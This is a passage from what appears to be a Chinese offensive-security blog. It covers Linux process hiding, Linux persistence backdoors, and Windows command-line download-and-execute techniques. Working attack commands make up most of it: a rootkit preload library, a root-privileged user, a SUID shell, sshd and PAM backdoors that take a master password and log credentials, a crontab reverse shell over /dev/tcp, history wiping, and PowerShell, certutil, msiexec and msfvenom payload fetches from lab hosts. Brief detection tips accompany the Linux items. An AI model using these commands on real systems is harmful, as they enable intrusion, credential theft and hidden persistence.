https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line">cd libprocesshider/ &amp;&amp; make</span><br><span class="line"># 移动文件到/usr/local/lib/目录下</span><br><span class="line">cp libprocesshider.so /usr/local/lib/</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure><p>测试：运行 evil_script.py，</p><p><img src="/image/media/2022/secops/privilege-2-5.png"></p><p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p><p><img src="/image/media/2022/secops/privilege-2-6.png"></p><p>如何在Linux中发现隐藏的进程，</p><p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p><p>下载地址：<a href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># 使用</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure><p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p><p><img src="/image/media/2022/secops/privilege-2-7.png"></p><p>第二种方法：进程注入工具linux-inject</p><p>linux-inject是用于将共享对象注入Linux进程的工具</p><p>github项目地址： <a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https://github.com/gaffe23/linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">./sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>验证进程注入成功，如下图所示：</p><p><img src="/image/media/2022/secops/privilege-2-8.png"></p><p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p><p>下载地址：<a href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载解压</span><br><span class="line">wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x07-结语"><a href="#0x07-结语" class="headerlink" title="0x07 结语"></a>0x07 结语</h3><p>本文主要介绍了Linux下的几种隐藏技术，包括隐藏文件、隐藏权限、隐藏历史操作命令、端口复用、进程隐藏等方面的技巧。仅作抛砖引玉之用，欢迎留言分享。</p><h2 id="Linux权限维持–后门篇"><a href="#Linux权限维持–后门篇" class="headerlink" title="Linux权限维持–后门篇"></a>Linux权限维持–后门篇</h2><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p><h3 id="0x01-一句话添加用户和密码"><a href="#0x01-一句话添加用户和密码" class="headerlink" title="0x01 一句话添加用户和密码"></a><strong>0x01 一句话添加用户和密码</strong></h3><p>添加普通用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line"></span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line"></span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure><p>添加root用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p>可疑用户排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure><h3 id="0x02-SUID-Shell"><a href="#0x02-SUID-Shell" class="headerlink" title="0x02 SUID Shell"></a><strong>0x02 SUID Shell</strong></h3><p>Suid shell是一种可用于以拥有者权限运行的shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure><p>使用guest用户登录就可疑获取root权限。</p><p><img src="/image/media/2022/secops/privilege-5-1.png"></p><p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm /4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm /2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure><h3 id="0x03-ssh公私钥免密登录"><a href="#0x03-ssh公私钥免密登录" class="headerlink" title="0x03 ssh公私钥免密登录"></a><strong>0x03 ssh公私钥免密登录</strong></h3><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>过程中按三次回车，执行结束如下图:</p><p><img src="/image/media/2022/secops/privilege-5-2.png"></p><p>进入/root/.ssh/文件夹，查看文件夹的内容，如下所示：</p><p><img src="/image/media/2022/secops/privilege-5-3.png"></p><p>其中 <code>id_rsa</code>为私钥，<code>id_rsa.pub</code>为公钥，接下来打开<code>id_rsa.pub</code>，将内容复制到服务器。将<code>id_rsa.pub</code>的内容追加到<code>/root/.ssh/authorized_keys</code>内，配置完成。</p><p>排查技巧：查看<code>/root/.ssh/authorized_keys</code>是否被修改。</p><h3 id="0x04-软连接"><a href="#0x04-软连接" class="headerlink" title="0x04 软连接"></a><strong>0x04 软连接</strong></h3><p>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。通过软连接的方式，实质上PAM认证是通过软连接的文件名 <code>/tmp/su</code> 在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如: /etc/pam.d/su)，任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>，所以只要PAM配置文件中包含此配置即可SSH任意密码登陆，除了su中之外还有chsh、chfn同样可以。</p><p>在目标服务器上执行一句话后门：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure><p>执行完之后，任何一台机器<code>ssh root@IP -p 8888</code>，输入任意密码，成功登录。</p><p><img src="/image/media/2022/secops/privilege-5-4.png"></p><p>排查技巧：进程、端口都可以发现异常， kill -s 9 PID 结束进程即可清除后门。</p><p><img src="/image/media/2022/secops/privilege-5-4-1.png"></p><h3 id="0x05-SSH-wrapper"><a href="#0x05-SSH-wrapper" class="headerlink" title="0x05 SSH wrapper"></a><strong>0x05 SSH wrapper</strong></h3><p>首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p><p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p><p>服务端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">socat STDIO TCP4:target_ip:22,sourceport=13377</span><br><span class="line"></span><br><span class="line">#如果你想修改源端口，可以用python的struct标准库实现。其中x00x00LF是19526的大端形式，便于传输和处理。</span><br><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,19526)</span><br><span class="line">&gt;&gt;&gt; print repr(buffer)</span><br><span class="line">&#x27;\x00\x00LF&#x27;</span><br><span class="line">&gt;&gt;&gt; buffer = struct.pack(&#x27;&gt;I6&#x27;,13377)</span><br><span class="line">&gt;&gt;&gt; print buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-5-5.png"></p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ls -al /usr/sbin/sshd</span><br><span class="line"># cat /usr/sbin/sshd</span><br><span class="line">可通过重装ssh服务恢复。</span><br></pre></td></tr></table></figure><h3 id="0x06-strace后门"><a href="#0x06-strace后门" class="headerlink" title="0x06 strace后门"></a><strong>0x06 strace后门</strong></h3><p>通过命令替换动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source /root/.bashrc</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/privilege-5-5-1.png"></p><p>排查技巧：使用<code>alias</code>即可发现异常。</p><p><img src="/image/media/2022/secops/privilege-5-5-2.png"></p><h3 id="0x07-crontab反弹shell"><a href="#0x07-crontab反弹shell" class="headerlink" title="0x07 crontab反弹shell"></a><strong>0x07 crontab反弹shell</strong></h3><p>crontab命令用于设置周期性被执行的指令。新建shell脚本，利用脚本进行反弹。</p><p>a、创建shell脚本，例如在/etc/evil.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345  0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>chmod +sx /etc/evil.sh</code></p><p>b、crontab -e 设置定时任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#每一分钟执行一次</span><br><span class="line">*/1 * * * * root /etc/evil.sh</span><br></pre></td></tr></table></figure><p>重启crond服务，<code>service crond restart</code>，然后就可以用nc接收shell。</p><p><img src="/image/media/2022/secops/privilege-5-6.png"></p><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看可疑的定时任务列表</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><h3 id="0x08-openssh后门"><a href="#0x08-openssh后门" class="headerlink" title="0x08 openssh后门"></a><strong>0x08 openssh后门</strong></h3><p>利用openssh后门，设置SSH后门密码及root密码记录位置，隐蔽性较强，不易被发现。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">a、备份SSH配置文件</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line"></span><br><span class="line">b、解压并安装补丁</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff  /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line"></span><br><span class="line">c、记录用户名和密码的文件位置及其密码</span><br><span class="line">vi  includes.h</span><br><span class="line">#define ILOG &quot;/tmp/1.txt&quot;             //记录登录本机的用户名和密码</span><br><span class="line">#define OLOG &quot;/tmp/2.txt&quot;             //记录本机登录远程的用户名和密码</span><br><span class="line">#define SECRETPW &quot;123456789&quot;          //后门的密码</span><br><span class="line"></span><br><span class="line">d、修改版本信息</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;小版本号&quot;</span><br><span class="line"></span><br><span class="line">e、安装并编译</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line"></span><br><span class="line">f、对比原来的配置文件，使配置文件一致，然后修改文件日期。</span><br><span class="line"></span><br><span class="line">touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">g、清除操作记录</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure><p>排查技巧：利用strace找出ssh后门.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、获取可疑进程PI</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2、跟踪sshd PID</span><br><span class="line">strace -o aa -ff -p  PID</span><br><span class="line"># 3、查看记录密码打开文件</span><br><span class="line">grep open sshd* | grep -v -e No -e  null -e denied| grep  WR</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x09-PAM后门"><a href="#0x09-PAM后门" class="headerlink" title="0x09 PAM后门"></a><strong>0x09 PAM后门</strong></h3><p>PAM （Pluggable Authentication Modules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX 9.0等。</p><p>利用方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure><p>排查技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat /lib/security/pam_unix.so      #32位</span><br><span class="line">stat /lib64/security/pam_unix.so    #64位</span><br></pre></td></tr></table></figure><h3 id="0x010-rookit后门"><a href="#0x010-rookit后门" class="headerlink" title="0x010 rookit后门"></a><strong>0x010 rookit后门</strong></h3><p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p><p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p><p>连接后的截图：</p><p><img src="/image/media/2022/secops/privilege-5-7.png"></p><p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p><h2 id="Windows命令行文件下载方式汇总"><a href="#Windows命令行文件下载方式汇总" class="headerlink" title="Windows命令行文件下载方式汇总"></a>Windows命令行文件下载方式汇总</h2><p>当我们通过Web渗透获取了一个Shell，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？</p><p>一般来说，实现Windows文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；<strong>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式****。</strong>另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。</p><p><strong>在这里，****本文收集了15种常见的文件下载执行的方式，并结合具体案例</strong>，让我们一起来看看是怎么实现的吧。</p><hr><ul><li>PowerShell</li><li>Bitsadmin</li><li>certutil</li><li>wget</li><li>ipc$文件共享</li><li>FTP</li><li>TFTP</li><li>WinScp</li><li>msiexec</li><li>IEExec</li><li>mshta</li><li>rundll32</li><li>regsvr32 </li><li>MSXSL.EXE</li><li>pubprn.vbs</li></ul><hr><h3 id="0x01-PowerShell"><a href="#0x01-PowerShell" class="headerlink" title="0x01 PowerShell"></a><strong>0x01 PowerShell</strong></h3><p>PowerShell是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用。</p><p>远程下载文件保存在本地：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.28.128/imag/evil.txt&#x27;,&#x27;evil.exe&#x27;)</span><br></pre></td></tr></table></figure><p>远程执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-1.png"></p><h3 id="0x02-Bitsadmin"><a href="#0x02-Bitsadmin" class="headerlink" title="0x02 Bitsadmin"></a><strong>0x02 Bitsadmin</strong></h3><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\test\1.txt</span><br></pre></td></tr></table></figure><p>输入以上命令，成功下载文件。</p><p><img src="/image/media/2022/secops/20200413-2.png"></p><h3 id="0x03-certutil"><a href="#0x03-certutil" class="headerlink" title="0x03 certutil"></a><strong>0x03 certutil</strong></h3><p>用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p><p>注：缓存目录为：”%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#下载文件</span><br><span class="line">certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php</span><br><span class="line">#删除缓存</span><br><span class="line">certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-3.png"></p><h3 id="0x04-wget"><a href="#0x04-wget" class="headerlink" title="0x04 wget"></a><strong>0x04 wget</strong></h3><p>Windows环境下，可上传免安装的可执行程序wget.exe到目标机器，使用wget下载文件。</p><p>wget.exe下载：<a href="https://eternallybored.org/misc/wget/">https://eternallybored.org/misc/wget/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O &quot;evil.txt&quot; http://192.168.28.128/imag/evil.txt</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-4.png"></p><h3 id="0x05-ipc-文件共享"><a href="#0x05-ipc-文件共享" class="headerlink" title="0x05 ipc$文件共享"></a><strong>0x05 ipc$文件共享</strong></h3><p>IPC$(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#建立远程IPC连接</span><br><span class="line">net use \\192.168.28.128\ipc$ /user:administrator &quot;abc123!&quot;</span><br><span class="line">#复制远程文件到本地主机</span><br><span class="line">copy \\192.168.28.128\c$\2.txt D:\test</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-5.png"></p><h3 id="0x06-FTP"><a href="#0x06-FTP" class="headerlink" title="**0x06 FTP **"></a>**0x06 FTP **</h3><p>一般情况下攻击者使用FTP上传文件需要很多交互的步骤，下面这个 bash脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">get file</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-6.png"></p><h3 id="0x07-TFTP"><a href="#0x07-TFTP" class="headerlink" title="0x07 TFTP"></a><strong>0x07 TFTP</strong></h3><p>用来下载远程文件的最简单的网络协议，它基于UDP协议而实现</p><p>tftp32服务端下载地址：<a href="http://tftpd32.jounin.net/tftpd32_download.html">http://tftpd32.jounin.net/tftpd32_download.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i 你的IP get 要下载文件 存放位置</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/secops/20200413-7.png"></p><h3 id="0x08-WinScp"><a href="#0x08-WinScp" class="headerlink" title="0x08 WinScp"></a><strong>0x08 WinScp</strong></h3><p>WinSCP是一个Windows环境下使用SSH的开源图形化SFTP客户端。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#上传</span><br><span class="line">winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;put D:\1.txt  /tmp/&quot; &quot;exit&quot; /log=log_file.txt </span><br><span class="line"></span><br><span class="line">#下载</span><br><span class="line">winscp.exe /console /command &quot;option batch continue&quot; &quot;option confirm off&quot; &quot;open sftp://bypass:abc123!@192.168.28.131:22&quot; &quot;option transfer binary&quot; &quot;get /tmp D:\test\app\&quot; &quot;exit&quot; /log=log_file.tx</span><br></pre></td></tr></table></figure><p>使用winscp.exe 作为命令行参数执行远程上传/下载操作。</p><p><img src="/image/media/2022/secops/20200413-8.png"></p><h3 id="0x09-msiexec"><a href="#0x09-msiexec" class="headerlink" title="0x09 msiexec"></a><strong>0x09 msiexec</strong></h3><p>msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#生成msi包</span><br><span class="line">msfvenom -p windows/exec CMD=&#x27;net user test abc123! /add&#x27; -f msi &gt; evil.msi</span><br><span class="line">#远程执行</span><br><span class="line">msiexec /q /i http://192.168.28.128/evil.msi</span><br></pre></td></tr></table></figure><p>成功添加了一个test用户：</p><p><img src="/image/media/2022/secops/20200413-9.png"></p><h3 id="0x10-IEExec"><a href="#0x10-IEExec" class="headerlink" title="0x10 IEExec"></a><strong>0x10 IEExec</strong></h3><p>IEexec.exe应用程序是.NET Framework附带程序，存在于多个系统白名单内。</p><p>生成Payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe</span><br></pre></td></tr></table></figure><p>使用管理员身份打开cmd，分别运行下面两条命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe</span><br></pre></td></tr></table></figure><p><img 